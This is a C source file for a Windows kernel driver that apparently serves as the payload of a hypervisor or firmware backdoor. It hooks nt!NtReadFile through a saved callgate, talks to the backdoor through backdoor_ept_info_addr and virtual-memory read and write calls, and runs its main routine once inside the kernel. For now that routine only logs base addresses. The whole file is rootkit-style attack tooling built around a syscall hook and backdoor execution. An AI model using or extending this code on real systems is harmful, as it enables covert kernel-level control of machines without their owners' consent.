#include "stdafx.h"

// size of the nt!NtReadFile() call stub
#define MAX_CALLGATE_LEN 0x40

typedef NTSTATUS (NTAPI * func_NtReadFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

PVOID m_Driver = NULL;

// callgate for original nt!NtReadFile()
UCHAR old_NtReadFile[MAX_CALLGATE_LEN];
//--------------------------------------------------------------------------------------
void *bd_alloc(size_t size)
{
    // heap alloc
    return I_ExAllocatePool(NonPagedPool, size);
}

void bd_free(void *addr)
{
    // heap free
    I_ExFreePool(addr);
}

void bd_sleep(int msec)
{
    // not implemented
}

void bd_yeld(void)
{
    // not implemented
}

void bd_printf(char *format, ...)
{
    // not implemented
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverMain(void)
{
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\n");

    DbgMsg(__FILE__, __LINE__, "Kernel base address is "IFMT"\n", GetKernelBase());
    DbgMsg(__FILE__, __LINE__, "Driver base address is "IFMT"\n", m_Driver);

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI new_NtReadFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    uint64_t Addr = 0;
    uint32_t Val = 0;

    // get call counter address
    if (backdoor_ept_info_addr(&Addr) == 0)
    {
        // read call counter
        if (backdoor_virt_read_32(Addr, &Val) == 0)
        {
            // check if hook handler was already executed
            if (Val == 0)
            {
                // exeute main function
                DriverMain();
            }

            // update call counter
            backdoor_virt_write_32(Addr, Val + 1);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_phys_read_32() fails\n");
        }
    }    

    // call original function
    return ((func_NtReadFile)&old_NtReadFile)(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        Buffer,
        Length,
        ByteOffset,
        Key
    );
}
//--------------------------------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject)
{   
    // ...
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    DriverObject->DriverUnload = DriverUnload;

    return DriverMain();
}
//--------------------------------------------------------------------------------------
// EoF
